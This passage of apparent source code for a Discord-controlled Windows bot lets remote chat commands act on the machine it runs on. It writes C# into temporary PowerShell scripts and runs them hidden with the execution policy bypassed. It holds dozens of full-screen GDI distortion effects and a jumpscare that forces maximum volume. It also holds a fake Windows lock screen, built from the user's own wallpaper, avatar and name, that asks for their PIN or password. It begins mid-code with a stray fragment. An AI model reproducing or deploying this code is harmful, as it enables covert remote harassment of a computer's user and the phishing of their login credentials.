    static int L(int c) { return (((c >> 16) & 255) * 29 + ((c >> 8) & 255) * 150 + (c & 255) * 77) >> 8; }
    static int Rgb(int r, int g, int b) { return unchecked((int)(0xFF000000 | ((uint)C(r, 256) << 16) | ((uint)C(g, 256) << 8) | (uint)C(b, 256))); }
    static void FxUpsideDown(Graphics g, int W, int H, Random r, int t)
{
    using (var b = new Bitmap(W, H))
    using (var bg = Graphics.FromImage(b))
    { bg.CopyFromScreen(0, 0, 0, 0, new Size(W, H)); b.RotateFlip(RotateFlipType.Rotate180FlipNone); g.DrawImage(b, 0, 0, W, H); }
}

static void FxSwirlMelt(Graphics g, int W, int H, Random r, int t)
{
    for (int y = 0; y < H; y += 4)
    {
        int off = (int)(Math.Sin((y + t * 7) * 0.02) * 45);
        using (var b = new Bitmap(W, 4)) using (var bg = Graphics.FromImage(b))
        { bg.CopyFromScreen(0, y, 0, 0, new Size(W, 4)); g.DrawImage(b, off, y, W, 4); }
    }
}

static void FxGhostTrail(Graphics g, int W, int H, Random r, int t)
{
    using (var b = new Bitmap(W, H)) using (var bg = Graphics.FromImage(b))
    { bg.CopyFromScreen(0, 0, 0, 0, new Size(W, H)); g.DrawImage(b, (int)(Math.Sin(t * 0.6) * 18), (int)(Math.Cos(t * 0.4) * 12), W, H); }
    using (var p = new Pen(Color.FromArgb(60, 255, 255, 255), 2)) g.DrawRectangle(p, 0, 0, W - 1, H - 1);
}

static void FxTunnelZoom(Graphics g, int W, int H, Random r, int t)
{
    double k = 1 + (t % 40) * 0.006;
    using (var b = new Bitmap(W, H)) using (var bg = Graphics.FromImage(b))
    { bg.CopyFromScreen(0, 0, 0, 0, new Size(W, H)); }
    g.DrawImage(b, new Rectangle((int)(W * (1 - k) / 2), (int)(H * (1 - k) / 2), (int)(W * k), (int)(H * k)));
}

static void FxBarCodeSweep(Graphics g, int W, int H, Random r, int t)
{
    for (int x = 0; x < W; x += 6)
        using (var p = new SolidBrush(Color.FromArgb(r.Next(20, 90), 0, 0, 0)))
            g.FillRectangle(p, x, 0, r.Next(2, 5), H);
    using (var p = new Pen(Color.FromArgb(140, 0, 255, 0), 3)) g.DrawLine(p, 0, (t * 12) % H, W, (t * 12) % H);
}

static void FxRipplePool(Graphics g, int W, int H, Random r, int t)
{
    for (int i = 0; i < 7; i++)
        using (var p = new Pen(Color.FromArgb(70, 0, 200, 255), 2))
            g.DrawEllipse(p, W / 2 - (t * 14 + i * 70), H / 2 - (t * 9 + i * 45), (t * 28 + i * 140), (t * 18 + i * 90));
}

static void FxShatteredMirror(Graphics g, int W, int H, Random r, int t)
{
    using (var b = new Bitmap(W, H)) using (var bg = Graphics.FromImage(b))
    { bg.CopyFromScreen(0, 0, 0, 0, new Size(W, H));
      for (int i = 0; i < 26; i++)
      {
          int sx = r.Next(0, W - 120), sy = r.Next(0, H - 120);
          g.DrawImage(b, new Rectangle(sx + r.Next(-14, 14), sy + r.Next(-14, 14), 120, 120), new Rectangle(sx, sy, 120, 120), GraphicsUnit.Pixel);
      } }
}

static void FxNeonOutline(Graphics g, int W, int H, Random r, int t)
{
    for (int i = 0; i < 6; i++)
        using (var p = new Pen(Color.FromArgb(120, r.Next(120, 255), r.Next(60, 255), r.Next(120, 255)), 3))
            g.DrawRectangle(p, i * 9, i * 9, W - i * 18, H - i * 18);
}

static void F

    public static void Run(int mode, int ms)
    {
        int w = V.Width, h = V.Height;
        if (w < 16 || h < 16) return;
        Bitmap src = new Bitmap(w, h, PixelFormat.Format32bppPArgb);
        using (Graphics g = Graphics.FromImage(src)) g.CopyFromScreen(V.X, V.Y, 0, 0, new Size(w, h));
        Bitmap dst = new Bitmap(w, h, PixelFormat.Format32bppPArgb);
        int[] sa = new int[w * h], da = new int[w * h], pa = new int[w * h];
        BitmapData sd = src.LockBits(new Rectangle(0, 0, w, h), ImageLockMode.ReadOnly, PixelFormat.Format32bppPArgb);
        Marshal.Copy(sd.Scan0, sa, 0, sa.Length);
        src.UnlockBits(sd);

        Random rnd = new Random();
        DateTime end = DateTime.Now.AddMilliseconds(ms);
        int t = 0;
        double cx = w / 2.0, cy = h / 2.0;

        while (DateTime.Now < end)
        {
            Array.Copy(sa, da, sa.Length);
            switch (mode)
            {
                case 0: for (int i = 0; i < da.Length; i++) da[i] = sa[i] ^ 0x00FFFFFF; break;
                case 1: for (int i = 0; i < da.Length; i++) { int l = L(sa[i]); da[i] = Rgb(l, l, l); } break;
                case 2: for (int i = 0; i < da.Length; i++) { int c = sa[i], l = L(c); da[i] = Rgb(l + 40, l + 12, l - 20); } break;
                case 3: for (int i = 0; i < da.Length; i++) { int v = L(sa[i]) > 110 ? 255 : 0; da[i] = Rgb(v, v, v); } break;
                case 4: for (int i = 0; i < da.Length; i++) { int c = sa[i]; da[i] = Rgb(((c >> 16) & 255) / 64 * 64, ((c >> 8) & 255) / 64 * 64, (c & 255) / 64 * 64); } break;
                case 5: for (int i = 0; i < da.Length; i++) { int c = sa[i]; da[i] = Rgb((c >> 8) & 255, (c >> 16) & 255, c & 255); } break;
                case 6: for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) { int r = sa[y * w + C(x + 8, w)], g = sa[y * w + x], b = sa[y * w + C(x - 8, w)]; da[y * w + x] = Rgb((r >> 16) & 255, (g >> 8) & 255, b & 255); } break;
                case 7: { int o = (int)(Math.Sin(t * 0.2) * 14) + 6; for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) { int r = sa[y * w + C(x + o, w)], b = sa[y * w + C(x - o, w)]; da[y * w + x] = Rgb((r >> 16) & 255, (sa[y * w + x] >> 8) & 255, b & 255); } break; }
                case 8: for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) { int c = sa[y * w + x]; int m = (y % 3 == 0) ? 150 : 255; da[y * w + x] = Rgb(((c >> 16) & 255) * m / 255, ((c >> 8) & 255) * m / 255, (c & 255) * m / 255); } break;
                case 9: for (int i = 0; i < da.Length; i++) { int n = rnd.Next(-40, 41); int c = sa[i]; da[i] = Rgb(((c >> 16) & 255) + n, ((c >> 8) & 255) + n, (c & 255) + n); } break;
                case 10: { int b = 6 + (t % 24); for (int y = 0; y < h; y += b) for (int x = 0; x < w; x += b) { int c = sa[C(y + b / 2, h) * w + C(x + b / 2, w)]; for (int yy = y; yy < Math.Min(y + b, h); yy++) for (int xx = x; xx < Math.Min(x + b, w); xx++) da[yy * w + xx] = c; } break; }
                case 11: { int b = 10; int ox = (t * 3) % w, oy = (t * 2) % h; for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) da[y * w + x] = sa[W(y + oy, h) / b * b * w + W(x + ox, w) / b * b]; break; }
                case 12: { int o = (t * 6) % w; for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) da[y * w + x] = sa[y * w + W(x + o, w)]; break; }
                case 13: { int o = (t * 5) % h; for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) da[y * w + x] = sa[W(y + o, h) * w + x]; break; }
                case 14: for (int y = 0; y < h; y++) { int o = (int)(Math.Sin(y * 0.02 + t * 0.15) * 22); for (int x = 0; x < w; x++) da[y * w + x] = sa[y * w + W(x + o, w)]; } break;
                case 15: for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) { double dx = x - cx, dy = y - cy; double d = Math.Sqrt(dx * dx + dy * dy); int o = (int)(Math.Sin(d * 0.05 - t * 0.3) * 14); da[y * w + x] = sa[C(y, h) * w + C(x + o, w)]; } break;
                case 16: for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) { double dx = x - cx, dy = y - cy; double a = Math.Atan2(dy, dx) + Math.Sqrt(dx * dx + dy * dy) * 0.006 + t * 0.03; double r = Math.Sqrt(dx * dx + dy * dy); da[y * w + x] = sa[C((int)(cy + Math.Sin(a) * r), h) * w + C((int)(cx + Math.Cos(a) * r), w)]; } break;
                case 17: { int qw = Math.Max(1, w / 2), qh = Math.Max(1, h / 2); int o = (t * 4) % qw; for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) { int sx = x % qw, sy = y % qh; if (((x / qw) + (y / qh)) % 2 == 1) sx = qw - 1 - sx; da[y * w + x] = sa[sy * w + W(sx + o, qw)]; } break; }
                case 18: { double z = 1.0 + (t % 40) * 0.02; for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) { int sx = C((int)(cx + (x - cx) / z), w), sy = C((int)(cy + (y - cy) / z), h); da[y * w + x] = sa[sy * w + sx]; } break; }
                case 19: { double a = t * 0.03; double ca = Math.Cos(a), sn = Math.Sin(a); for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) { double dx = x - cx, dy = y - cy; da[y * w + x] = sa[C((int)(cy + dx * sn + dy * ca), h) * w + C((int)(cx + dx * ca - dy * sn), w)]; } break; }
                case 20: { double z = 1.0 + Math.Sin(t * 0.15) * 0.15; for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) da[y * w + x] = sa[C((int)(cy + (y - cy) / z), h) * w + C((int)(cx + (x - cx) / z), w)]; break; }
                case 21: for (int y = 0; y < h; y++) { int o = (int)((y - cy) * 0.12 * Math.Sin(t * 0.1)); for (int x = 0; x < w; x++) da[y * w + x] = sa[y * w + W(x + o, w)]; } break;
                case 22: for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) da[y * w + x] = sa[y * w + (x < w / 2 ? w / 2 - x : w - 1 - (x - w / 2))]; break;
                case 23: { int o = (t * 8) % 40; for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) { int c = sa[y * w + x]; da[y * w + x] = ((x + o) % 40 < 20) ? c : Rgb(((c >> 16) & 255) / 4, ((c >> 8) & 255) / 4, (c & 255) / 4); } break; }
                case 24: { int o = (t * 6) % 64; for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) { int c = sa[y * w + x]; da[y * w + x] = (((x + o) / 32 + y / 32) % 2 == 0) ? c : Rgb(((c >> 16) & 255) / 3, ((c >> 8) & 255) / 3, (c & 255) / 3); } break; }
                case 25: for (int y = 1; y < h - 1; y++) for (int x = 1; x < w - 1; x++) { int a = L(sa[y * w + x + 1]), b = L(sa[y * w + x - 1]), c2 = L(sa[(y + 1) * w + x]), d = L(sa[(y - 1) * w + x]); int v = Math.Min(255, Math.Abs(a - b) + Math.Abs(c2 - d)); da[y * w + x] = Rgb(v, v, v); } break;
                case 26: for (int y = 1; y < h - 1; y++) for (int x = 1; x < w - 1; x++) { int v = L(sa[(y - 1) * w + x - 1]) - L(sa[(y + 1) * w + x + 1]) + 128; da[y * w + x] = Rgb(v, v, v); } break;
                case 27: for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) { int r = 0, g = 0, b = 0; for (int k = 0; k < 6; k++) { int sx = C((int)(cx + (x - cx) * (1 - k * 0.03)), w), sy = C((int)(cy + (y - cy) * (1 - k * 0.03)), h); int c = sa[sy * w + sx]; r += (c >> 16) & 255; g += (c >> 8) & 255; b += c & 255; } da[y * w + x] = Rgb(r / 6, g / 6, b / 6); } break;
                case 28: for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) { double dx = (x - cx) / cx, dy = (y - cy) / cy; double v = 1.0 - Math.Min(1.0, (dx * dx + dy * dy) * 0.55); int c = sa[y * w + x]; da[y * w + x] = Rgb((int)(((c >> 16) & 255) * v), (int)(((c >> 8) & 255) * v), (int)((c & 255) * v)); } break;
                case 29: for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) { int c = sa[y * w + x]; if (L(c) > 190) { int r = (c >> 16) & 255, g = (c >> 8) & 255, b = c & 255; da[y * w + x] = Rgb(r + 40, g + 40, b + 40); } } break;
                case 30: for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) { int c = sa[y * w + x]; int v = (int)(Math.Sin(x * 0.03 + t * 0.1) * Math.Cos(y * 0.03 - t * 0.07) * 40); da[y * w + x] = Rgb(((c >> 16) & 255) + v, ((c >> 8) & 255) + v, (c & 255) - v); } break;
                case 31: for (int y = 0; y < h; y++) { if (rnd.Next(0, 9) == 0) { int o = rnd.Next(-40, 41); for (int x = 0; x < w; x++) da[y * w + x] = sa[y * w + W(x + o, w)]; } } break;
                case 32: for (int k = 0; k < 14; k++) { int bw = rnd.Next(40, 260), bh = rnd.Next(20, 120); int dx2 = rnd.Next(0, Math.Max(1, w - bw)), dy2 = rnd.Next(0, Math.Max(1, h - bh)); int sx = rnd.Next(0, Math.Max(1, w - bw)), sy = rnd.Next(0, Math.Max(1, h - bh)); for (int y = 0; y < bh; y++) Array.Copy(sa, (sy + y) * w + sx, da, (dy2 + y) * w + dx2, bw); } break;
                case 33: for (int i = 0; i < da.Length; i++) { int c = pa[i]; da[i] = Rgb(((c >> 16) & 255) / 2, ((c >> 8) & 255) / 2, (c & 255) / 2); } for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) da[y * w + x] = sa[y * w + x] | da[y * w + x]; break;
                case 34: for (int i = 0; i < da.Length; i++) { int a = sa[i], b = pa[i]; da[i] = Rgb((((a >> 16) & 255) + ((b >> 16) & 255)) / 2, (((a >> 8) & 255) + ((b >> 8) & 255)) / 2, ((a & 255) + (b & 255)) / 2); } break;
                case 35: for (int x = 0; x < w; x++) { int o = (int)(Math.Sin(x * 0.02 + t * 0.05) * 40); for (int y = 0; y < h; y++) da[y * w + x] = sa[C(y + o, h) * w + x]; } break;
                case 36: { int ox = (int)(Math.Sin(t * 0.6) * 12), oy = (int)(Math.Cos(t * 0.4) * 12); for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) da[y * w + x] = sa[C(y + oy, h) * w + C(x + ox, w)]; break; }
                case 37: for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) { double dx = (x - cx) / cx, dy = (y - cy) / cy; double r = Math.Sqrt(dx * dx + dy * dy); double k = 1.0 + r * r * 0.45; da[y * w + x] = sa[C((int)(cy + dy * k * cy), h) * w + C((int)(cx + dx * k * cx), w)]; } break;
                case 38: for (int y = 0; y < h; y++) { int o = (int)(Math.Sin(y * 0.08 + t * 0.2) * 30); for (int x = 0; x < w; x++) { int c = sa[y * w + W(x + o, w)]; da[y * w + x] = ((y / 24) % 2 == 0) ? c : Rgb(((c >> 16) & 255) / 2, ((c >> 8) & 255) / 2, (c & 255) / 2); } } break;
                default: if (t % 8 < 4) for (int i = 0; i < da.Length; i++) da[i] = sa[i] ^ 0x00FFFFFF; break;
            }
            BitmapData dd = dst.LockBits(new Rectangle(0, 0, w, h), ImageLockMode.WriteOnly, PixelFormat.Format32bppPArgb);
            Marshal.Copy(da, 0, dd.Scan0, da.Length);
            dst.UnlockBits(dd);
            using (Graphics g = Graphics.FromHwnd(IntPtr.Zero)) g.DrawImageUnscaled(dst, V.X, V.Y);
            Array.Copy(da, pa, da.Length);
            t++;
            Thread.Sleep(33);
        }
        using (Graphics g = Graphics.FromHwnd(IntPtr.Zero)) g.DrawImageUnscaled(src, V.X, V.Y);
    }
}
"""

_GDI_PS1 = os.path.join(tempfile.gettempdir(), "lmfx.ps1")

def _gdi_ps1():
    try:
        if os.path.exists(_GDI_PS1) and os.path.getsize(_GDI_PS1) > 6000:
            return _GDI_PS1
        with open(_GDI_PS1, "w", encoding="utf-8") as f:
            f.write("Add-Type -AssemblyName System.Drawing,System.Windows.Forms\n")
            f.write("$src = @'\n" + _GDI_SRC + "\n'@\n")
            f.write("Add-Type -TypeDefinition $src -ReferencedAssemblies System.Drawing,System.Windows.Forms\n")
            f.write("[LmFx]::Run([int]$env:LM_MODE, [int]$env:LM_MS)\n")
        return _GDI_PS1
    except Exception:
        return None

def _gdi(mode, seconds=8):
    p = _gdi_ps1()
    if not p:
        return False
    subprocess.Popen(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", p],
                     creationflags=_CNW, stdin=subprocess.DEVNULL,
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                     env=dict(os.environ, LM_MODE=str(mode), LM_MS=str(int(seconds * 1000))))
    return True

def _gdi_cmd(mode, name, aliases, secs=8):
    async def _c(ctx, s: int = secs):
        if _gdi(mode, max(2, min(s, 90))):
            await ctx.send(embed=create_embed("🖼️ " + name, "The {} effect is now running over every display for {} seconds.".format(name.replace("gdi-", ""), s), 0xb9a8ff))
        else:
            await ctx.send(embed=create_embed("🖼️ " + name, "The GDI engine could not be started on this machine.", 0xff4444))
    _c.__name__ = "gdi_" + re.sub(r"\W", "_", name.lower())
    bot.command(name=name, aliases=aliases)(_c)

for _m, _n, _a in [
    (0, "gdi-invert", ["ginv"]), (1, "gdi-gray", ["ggray"]), (2, "gdi-sepia", ["gsepia"]),
    (3, "gdi-threshold", ["gthr"]), (4, "gdi-posterize", ["gpost"]), (5, "gdi-hue", ["ghue"]),
    (6, "gdi-rgbsplit", ["gsplit"]), (7, "gdi-chroma", ["gchroma"]), (8, "gdi-crt", ["gcrt"]),
    (9, "gdi-snow", ["gsnow"]), (10, "gdi-pixelate", ["gpix"]), (11, "gdi-mosaic", ["gmosaic"]),
    (12, "gdi-rollh", ["grollh"]), (13, "gdi-rollv", ["grollv"]), (14, "gdi-wobble", ["gwobble"]),
    (15, "gdi-ripple", ["gripple"]), (16, "gdi-swirl", ["gswirl"]), (17, "gdi-kaleido", ["gkaleido"]),
    (18, "gdi-tunnel", ["gtunnel"]), (19, "gdi-spin", ["gspin"]), (20, "gdi-zoompulse", ["gzoom"]),
    (21, "gdi-shear", ["gshear"]), (22, "gdi-mirror", ["gmirror"]), (23, "gdi-blinds", ["gblinds"]),
    (24, "gdi-checker", ["gchecker"]), (25, "gdi-edge", ["gedge"]), (26, "gdi-emboss", ["gemboss"]),
    (27, "gdi-radialblur", ["gblur"]), (28, "gdi-vignette", ["gvignette"]), (29, "gdi-bloom", ["gbloom"]),
    (30, "gdi-plasma", ["gplasma"]), (31, "gdi-datamosh", ["gmosham"]), (32, "gdi-glitch", ["gglitch"]),
    (33, "gdi-echo", ["gecho"]), (34, "gdi-trails", ["gtrails"]), (35, "gdi-melt", ["gmelt"]),
    (36, "gdi-shake", ["gshake"]), (37, "gdi-fisheye", ["gfish"]), (38, "gdi-stripes", ["gstripes"]),
    (39, "gdi-strobe", ["gstrobe"]),
]:
    _gdi_cmd(_m, _n, _a)

_JS_PS1 = os.path.join(tempfile.gettempdir(), "lmjs.ps1")

_JS_SRC = r"""
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Media;
using System.Windows.Forms;

public static class LmJs
{
    public static void Run(string img, string snd, int ms)
    {
        var forms = new List<Form>();
        Image pic = Image.FromFile(img);
        foreach (Screen s in Screen.AllScreens)
        {
            var f = new Form();
            f.FormBorderStyle = FormBorderStyle.None;
            f.StartPosition = FormStartPosition.Manual;
            f.Bounds = s.Bounds;
            f.TopMost = true;
            f.ShowInTaskbar = false;
            f.BackColor = Color.Black;
            var pb = new PictureBox();
            pb.Dock = DockStyle.Fill;
            pb.SizeMode = PictureBoxSizeMode.StretchImage;
            pb.Image = pic;
            f.Controls.Add(pb);
            f.Show();
            forms.Add(f);
        }
        try { if (snd != null && snd.Length > 0) { var p = new SoundPlayer(snd); p.Play(); } }
        catch { }
        var t = new Timer();
        t.Interval = ms;
        t.Tick += delegate { foreach (var f in forms) f.Close(); t.Stop(); Application.ExitThread(); };
        t.Start();
        Application.Run();
        foreach (var f in forms) f.Dispose();
    }
}
"""

def _js_ps1():
    try:
        if os.path.exists(_JS_PS1) and os.path.getsize(_JS_PS1) > 1200:
            return _JS_PS1
        with open(_JS_PS1, "w", encoding="utf-8") as f:
            f.write("Add-Type -AssemblyName System.Drawing,System.Windows.Forms\n")
            f.write("$src = @'\n" + _JS_SRC + "\n'@\n")
            f.write("Add-Type -TypeDefinition $src -ReferencedAssemblies System.Drawing,System.Windows.Forms\n")
            f.write("[LmJs]::Run($env:LM_IMG, $env:LM_SND, [int]$env:LM_MS)\n")
        return _JS_PS1
    except Exception:
        return None

JUMPSCARE_URL = "https://github.com/MateAGYT/LessMi/raw/main/resources/jump.mp4"
JUMP_MIN = 100_000


def _jump_ready(path):
    try:
        return os.path.exists(path) and os.path.getsize(path) > JUMP_MIN
    except Exception:
        return False


async def _ensure_jump():
    for p in (resource_path("jump.mp4"), os.path.join(BASE_DIR, "jump.mp4")):
        if _jump_ready(p):
            return p
    os.makedirs(BASE_DIR, exist_ok=True)
    dest = os.path.join(BASE_DIR, "jump.mp4")
    tmp = dest + ".part"
    async with aiohttp.ClientSession() as s:
        async with s.get(JUMPSCARE_URL, allow_redirects=True,
                         timeout=aiohttp.ClientTimeout(total=60)) as r:
            if r.status != 200:
                raise OSError(f"HTTP {r.status}")
            data = await r.read()
    if len(data) < JUMP_MIN or b"ftyp" not in data[:64]:
        raise OSError("bad payload (LFS pointer or error HTML)")
    with builtins.open(tmp, "wb") as f:
        f.write(data)
    os.replace(tmp, dest)
    return dest


def _jump_audio(path):
    wav = os.path.join(BASE_DIR, "jump.wav")
    try:
        if os.path.exists(wav) and os.path.getsize(wav) > 4096:
            return wav
        subprocess.run(
            [FFMPEG_BIN, "-y", "-loglevel", "error", "-i", path, "-vn",
             "-acodec", "pcm_s16le", "-ar", "44100", "-ac", "2", wav],
            capture_output=True, creationflags=_CNW, timeout=90)
        if os.path.exists(wav) and os.path.getsize(wav) > 4096:
            return wav
    except Exception:
        pass
    return None


def _play_jump(path):
    wav = _jump_audio(path)
    if wav:
        try:
            winsound.PlaySound(wav, winsound.SND_FILENAME | winsound.SND_ASYNC)
        except Exception:
            pass

    cap = None
    try:
        cap = cv2.VideoCapture(path)
        if not cap.isOpened():
            raise OSError("no decoder")

        fps = cap.get(cv2.CAP_PROP_FPS)
        delay = max(1, int(1000.0 / (fps if fps and fps > 1 else 30.0)))

        cv2.namedWindow("jump", cv2.WINDOW_NORMAL)
        cv2.setWindowProperty("jump", cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
        try:
            cv2.setWindowProperty("jump", cv2.WND_PROP_TOPMOST, 1)
            cv2.setWindowProperty("jump", cv2.WND_PROP_ASPECT_RATIO, cv2.WINDOW_KEEPRATIO)
        except Exception:
            pass

        first = True
        while True:
            ok, frame = cap.read()
            if not ok:
                break
            if first:
                first = False
                h, w = frame.shape[:2]
                cv2.resizeWindow("jump", w, h)
            cv2.imshow("jump", frame)
            cv2.waitKey(delay)

        cap.release()
        cap = None
        cv2.waitKey(120)
        cv2.destroyWindow("jump")
        cv2.waitKey(120)
        return "cv2"
    except Exception:
        return None
    finally:
        if cap is not None:
            try:
                cap.release()
            except Exception:
                pass
        try:
            winsound.PlaySound(None, winsound.SND_PURGE)
        except Exception:
            pass

@bot.command()
async def jumpscare(ctx):
    await ctx.message.add_reaction("👻")
    try:
        path = await _ensure_jump()
    except Exception as e:
        await ctx.send(embed=create_embed("Error", f"jump.mp4: {e}", 0xFF0000))
        return

    try:
        await asyncio.to_thread(set_volume_level, 1.0)
    except Exception:
        pass

    used = None
    for _ in range(2):
        used = await asyncio.to_thread(_play_jump, path)
        if used:
            break
        await asyncio.sleep(0.3)

    if used:
        await ctx.send(embed=create_embed("👻 Jumpscare", f"Playing ({used}).", 0xFF0000))
        return

    try:
        os.startfile(path)
        await ctx.send(embed=create_embed("👻 Jumpscare", "Fallback to default player.", 0xFF0000))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", f"No player available: {e}", 0xFF0000))

_FL_PS1 = os.path.join(tempfile.gettempdir(), "lmfl.ps1")

_FL_SRC = r"""
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Globalization;
using System.IO;
using System.Windows.Forms;

public static class LmFl
{
    static List<Form> walls = new List<Form>();
    static Form main;
    static TextBox box;
    static Label hint, spinner, who;
    static int fails = 0;
    static Timer spin;
    static int sf = 0;
    static string user = Environment.UserName;

    static Image Wall(Screen s)
    {
        var bmp = new Bitmap(s.Bounds.Width, s.Bounds.Height);
        using (var g = Graphics.FromImage(bmp))
        {
            g.InterpolationMode = InterpolationMode.HighQualityBicubic;
            try
            {
                string wp = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    @"Microsoft\Windows\Themes\TranscodedWallpaper");
                if (File.Exists(wp))
                {
                    using (var src = Image.FromFile(wp))
                    {
                        double r = Math.Max((double)s.Bounds.Width / src.Width, (double)s.Bounds.Height / src.Height);
                        int w = (int)(src.Width * r), h = (int)(src.Height * r);
                        g.DrawImage(src, (s.Bounds.Width - w) / 2, (s.Bounds.Height - h) / 2, w, h);
                    }
                }
                else
                {
                    g.CopyFromScreen(s.Bounds.X, s.Bounds.Y, 0, 0, s.Bounds.Size);
                    using (var small = new Bitmap(bmp, Math.Max(1, bmp.Width / 24), Math.Max(1, bmp.Height / 24)))
                        g.DrawImage(small, 0, 0, bmp.Width, bmp.Height);
                }
            }
            catch { g.Clear(Color.FromArgb(20, 24, 32)); }
            using (var br = new SolidBrush(Color.FromArgb(96, 0, 0, 0)))
                g.FillRectangle(br, 0, 0, bmp.Width, bmp.Height);
        }
        return bmp;
    }

    static Image Avatar()
    {
        try
        {
            string p = @"C:\ProgramData\Microsoft\User Account Pictures\user.png";
            if (File.Exists(p)) return Image.FromFile(p);
        }
        catch { }
        var bmp = new Bitmap(128, 128);
        using (var g = Graphics.FromImage(bmp))
        {
            g.SmoothingMode = SmoothingMode.AntiAlias;
            using (var br = new SolidBrush(Color.FromArgb(240, 240, 240))) g.FillEllipse(br, 0, 0, 127, 127);
            using (var br = new SolidBrush(Color.FromArgb(120, 120, 120)))
            {
                g.FillEllipse(br, 44, 24, 40, 40);
                g.FillPie(br, 24, 70, 80, 90, 180, 180);
            }
        }
        return bmp;
    }

    public static void Run(int ms)
    {
        var scr = Screen.PrimaryScreen;
        foreach (Screen s in Screen.AllScreens)
        {
            if (s.DeviceName == scr.DeviceName) continue;
            var f = new Form();
            f.FormBorderStyle = FormBorderStyle.None;
            f.StartPosition = FormStartPosition.Manual;
            f.Bounds = s.Bounds;
            f.TopMost = true;
            f.ShowInTaskbar = false;
            var pb = new PictureBox();
            pb.Dock = DockStyle.Fill;
            pb.SizeMode = PictureBoxSizeMode.StretchImage;
            pb.Image = Wall(s);
            f.Controls.Add(pb);
            f.Show();
            walls.Add(f);
        }

        main = new Form();
        main.FormBorderStyle = FormBorderStyle.None;
        main.StartPosition = FormStartPosition.Manual;
        main.Bounds = scr.Bounds;
        main.TopMost = true;
        main.ShowInTaskbar = false;
        var bg = new PictureBox();
        bg.Dock = DockStyle.Fill;
        bg.SizeMode = PictureBoxSizeMode.StretchImage;
        bg.Image = Wall(scr);
        main.Controls.Add(bg);

        int cw = scr.Bounds.Width, ch = scr.Bounds.Height;

        var clock = new Label();
        clock.AutoSize = true;
        clock.ForeColor = Color.White;
        clock.BackColor = Color.Transparent;
        clock.Font = new Font("Segoe UI Light", 54);
        clock.Text = DateTime.Now.ToString("HH:mm");
        clock.Location = new Point((cw - 220) / 2, ch / 5);
        bg.Controls.Add(clock);

        var date = new Label();
        date.AutoSize = true;
        date.ForeColor = Color.White;
        date.BackColor = Color.Transparent;
        date.Font = new Font("Segoe UI", 16);
        date.Text = DateTime.Now.ToString("dddd, MMMM d", CultureInfo.InvariantCulture);
        date.Location = new Point((cw - 300) / 2, ch / 5 + 84);
        bg.Controls.Add(date);

        var av = new PictureBox();
        av.Size = new Size(120, 120);
        av.SizeMode = PictureBoxSizeMode.Zoom;
        av.BackColor = Color.Transparent;
        av.Image = Avatar();
        av.Location = new Point((cw - 120) / 2, ch / 2 - 110);
        bg.Controls.Add(av);

        who = new Label();
        who.AutoSize = false;
        who.TextAlign = ContentAlignment.MiddleCenter;
        who.Size = new Size(420, 30);
        who.ForeColor = Color.White;
        who.BackColor = Color.Transparent;
        who.Font = new Font("Segoe UI", 20);
        who.Text = user;
        who.Location = new Point((cw - 420) / 2, ch / 2 + 18);
        bg.Controls.Add(who);

        var panel = new Panel();
        panel.Size = new Size(300, 36);
        panel.BackColor = Color.FromArgb(230, 255, 255, 255);
        panel.Location = new Point((cw - 300) / 2, ch / 2 + 60);
        bg.Controls.Add(panel);

        box = new TextBox();
        box.BorderStyle = BorderStyle.None;
        box.Font = new Font("Segoe UI", 12);
        box.UseSystemPasswordChar = true;
        box.Size = new Size(250, 22);
        box.Location = new Point(12, 8);
        box.BackColor = Color.White;
        panel.Controls.Add(box);

        var go = new Label();
        go.Text = "→";
        go.Font = new Font("Segoe UI", 13);
        go.AutoSize = false;
        go.Size = new Size(28, 28);
        go.TextAlign = ContentAlignment.MiddleCenter;
        go.BackColor = Color.White;
        go.Location = new Point(268, 4);
        panel.Controls.Add(go);

        hint = new Label();
        hint.AutoSize = false;
        hint.Size = new Size(460, 40);
        hint.TextAlign = ContentAlignment.MiddleCenter;
        hint.ForeColor = Color.White;
        hint.BackColor = Color.Transparent;
        hint.Font = new Font("Segoe UI", 11);
        hint.Text = "PIN or password";
        hint.Location = new Point((cw - 460) / 2, ch / 2 + 104);
        bg.Controls.Add(hint);

        spinner = new Label();
        spinner.AutoSize = false;
        spinner.Size = new Size(60, 40);
        spinner.TextAlign = ContentAlignment.MiddleCenter;
        spinner.ForeColor = Color.White;
        spinner.BackColor = Color.Transparent;
        spinner.Font = new Font("Segoe UI", 16);
        spinner.Visible = false;
        spinner.Location = new Point((cw - 60) / 2, ch / 2 + 146);
        bg.Controls.Add(spinner);

        var other = new Label();
        other.Text = "Other user";
        other.AutoSize = true;
        other.ForeColor = Color.White;
        other.BackColor = Color.Transparent;
        other.Font = new Font("Segoe UI", 10);
        other.Location = new Point(40, ch - 60);
        bg.Controls.Add(other);

        string[] glyphs = { "\uE774", "\uE776", "\uE7E8" };
        int gx = cw - 130;
        foreach (string gl in glyphs)
        {
            var l = new Label();
            l.Text = gl;
            l.Font = new Font("Segoe MDL2 Assets", 15);
            l.AutoSize = false;
            l.Size = new Size(30, 30);
